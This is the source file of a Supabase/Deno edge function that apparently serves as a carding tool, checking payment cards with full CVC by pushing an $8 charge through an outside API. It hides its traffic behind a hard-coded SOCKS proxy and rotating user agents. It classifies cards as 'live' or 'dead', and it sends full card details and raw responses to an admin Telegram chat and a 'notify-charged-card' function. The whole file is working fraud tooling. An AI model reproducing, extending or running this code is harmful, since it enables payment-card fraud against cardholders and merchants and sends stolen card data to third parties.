import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Send FULL debug notification to admin Telegram with complete raw API response
const sendAdminDebugNotification = async (
  cc: string, 
  status: string, 
  rawApiResponse: string,
  parsedFields: { status: string; message: string; full_response: unknown }
) => {
  try {
    // Full unmasked card for admin debug
    const cardParts = cc.split('|');
    const fullCard = cc;
    const maskedCard = cardParts[0].slice(0, 6) + '******' + cardParts[0].slice(-4);
    
    const message = `🔍 *STRIPE CHARGE $8 - ${status}*

💳 *Card:* \`${maskedCard}\`
📊 *Result:* \`${status}\`
💵 *Amount:* \`$8.00\`

📋 *Parsed Fields:*
• status: \`${parsedFields.status}\`
• message: \`${String(parsedFields.message).substring(0, 200)}${String(parsedFields.message).length > 200 ? '...' : ''}\`
• full_response: \`${parsedFields.full_response}\`

📦 *Full Raw API Response:*
\`\`\`
${rawApiResponse.substring(0, 3000)}${rawApiResponse.length > 3000 ? '...(truncated)' : ''}
\`\`\``;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    console.log('[STRIPE-CHARGE] Sent admin debug notification for', status);
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to send admin notification:', error);
  }
};

// Notify charged card for live results
const notifyChargedCard = async (
  userId: string,
  cardDetails: string,
  status: string,
  responseMessage: string,
  amount: string,
  gateway: string,
  apiResponse?: string,
  screenshotUrl?: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  try {
    await fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
      },
      body: JSON.stringify({
        user_id: userId,
        card_details: cardDetails,
        status,
        response_message: responseMessage,
        amount,
        gateway,
        api_response: apiResponse,
        screenshot_url: screenshotUrl,
      }),
    });
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to notify charged card:', error);
  }
};

// NOTE: Only extracting status, message, and full_response from API
// All other parsing functions removed for cleaner implementation

// Perform API check with retry logic - ONLY capture: status, message, full_response
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  
  // Build API URL with exact format required
  const apiUrl = `http://web-production-7ad4f.up.railway.app/api?cc=${encodeURIComponent(cc)}&proxy=138.197.124.55:9150&proxytype=sock5`;
  
  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries} - Calling API:`, apiUrl);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] Attempt ${attempt} - Raw API response:`, rawText);

    let rawData: Record<string, unknown>;
    try {
      rawData = JSON.parse(rawText);
    } catch {
      console.log(`[STRIPE-CHARGE] Failed to parse JSON, using raw text`);
      rawData = { status: "ERROR", message: rawText || "Failed to parse response", full_response: false };
    }

    // ONLY extract these 3 fields from API response
    const apiStatus = rawData?.status as string || 'UNKNOWN';
    const apiMessage = rawData?.message as string || 'No response';
    const fullResponse = rawData?.full_response;

    console.log(`[STRIPE-CHARGE] Captured fields - status: ${apiStatus}, message: ${apiMessage}, full_response: ${fullResponse}`);

    // Determine computed status from full_response field
    let computedStatus: "live" | "dead" | "unknown" = "unknown";
    
    // Primary: Check full_response boolean
    if (typeof fullResponse === 'boolean') {
      computedStatus = fullResponse === true ? "live" : "dead";
    } else if (String(fullResponse).toLowerCase() === 'true') {
      computedStatus = "live";
    } else if (String(fullResponse).toLowerCase() === 'false') {
      computedStatus = "dead";
    } else {
      // Fallback: Check message for decline indicators when full_response is missing
      const messageLower = apiMessage.toLowerCase();
      if (messageLower.includes('card_declined') || 
          messageLower.includes('declined') || 
          messageLower.includes('insufficient') ||
          messageLower.includes('expired') ||
          messageLower.includes('invalid') ||
          messageLower.includes('do_not_honor') ||
          messageLower.includes('lost_card') ||
          messageLower.includes('stolen_card')) {
        computedStatus = "dead";
      } else if (messageLower.includes('success') || 
                 messageLower.includes('approved') || 
                 messageLower.includes('charged')) {
        computedStatus = "live";
      }
    }
    
    console.log(`[STRIPE-CHARGE] Computed status: ${computedStatus}`);

    // Build display status
    const displayStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';

    // Extract clean message for UI display
    let cleanMessage = apiMessage;
    // If message contains JSON, try to extract the actual error message
    if (apiMessage.includes('"message"')) {
      const msgMatch = apiMessage.match(/"message":\s*"([^"]+)"/);
      if (msgMatch) {
        cleanMessage = msgMatch[1];
      }
    }

    // Send FULL admin debug notification with raw API response
    sendAdminDebugNotification(cc, displayStatus, rawText, { 
      status: apiStatus, 
      message: apiMessage, 
      full_response: fullResponse 
    });

    // Retry on UNKNOWN
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] UNKNOWN response on attempt ${attempt}, retrying...`);
      await new Promise(resolve => setTimeout(resolve, 1000));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }

    // Return ONLY the 3 captured fields + computed values
    return {
      computedStatus,
      apiStatus: displayStatus,
      apiMessage: cleanMessage,
      apiTotal: '$8.00',
      status: computedStatus,
      message: cleanMessage,
      fullResponse, // Internal/debug only
    };
  } catch (error) {
    console.error(`[STRIPE-CHARGE] Attempt ${attempt} - Fetch error:`, error);
    
    const errorMessage = error instanceof Error ? error.message : "API request failed";
    
    // Send error debug to admin
    sendAdminDebugNotification(cc, 'ERROR', String(error), { 
      status: 'ERROR',
      message: errorMessage,
      full_response: null 
    });
    
    if (attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] Retrying after fetch error...`);
      await new Promise(resolve => setTimeout(resolve, 1000));
      const newUserAgent = getRandomUserAgent();
      return performCheck(cc, newUserAgent, attempt + 1);
    }
    
    return { 
      computedStatus: "unknown",
      apiStatus: "ERROR",
      apiMessage: errorMessage,
      status: "unknown",
      message: errorMessage,
      fullResponse: null,
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY for charge gateways
    const cardParts = cc.split('|');
    if (cardParts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNumber, mm, yy, cvc] = cardParts;
    
    // Validate CVC is present and valid (3-4 digits)
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[STRIPE-CHARGE] Checking card for user:', user.id);
    console.log('[STRIPE-CHARGE] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    // Send Telegram notification for LIVE cards
    const status = data.computedStatus as string;
    if (status === "live") {
      const responseMsg = `${data.apiStatus}: ${data.apiMessage} ($8.00)`;
      notifyChargedCard(
        user.id,
        cc,
        "CHARGED",
        responseMsg,
        "$8.00",
        "Yunchi Stripe Charge",
        undefined,
        undefined
      );
    }

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[STRIPE-CHARGE] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
